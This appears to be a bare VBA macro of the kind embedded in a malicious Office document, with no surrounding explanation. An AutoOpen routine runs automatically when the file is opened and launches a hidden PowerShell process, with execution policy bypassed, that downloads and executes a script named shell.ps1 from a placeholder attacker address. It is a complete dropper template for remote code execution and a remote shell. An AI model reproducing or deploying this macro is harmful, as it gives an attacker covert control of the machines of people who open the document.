Sub AutoOpen()
    Call ExecPayload
End Sub

Sub ExecPayload()
    Dim shell As Object
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    cmd = "powershell.exe -nop -w hidden -ep bypass iex (new-object net.webclient).downloadstring('<ATTACKER IP>/shell.ps1')"

    shell.Run cmd, 0
End Sub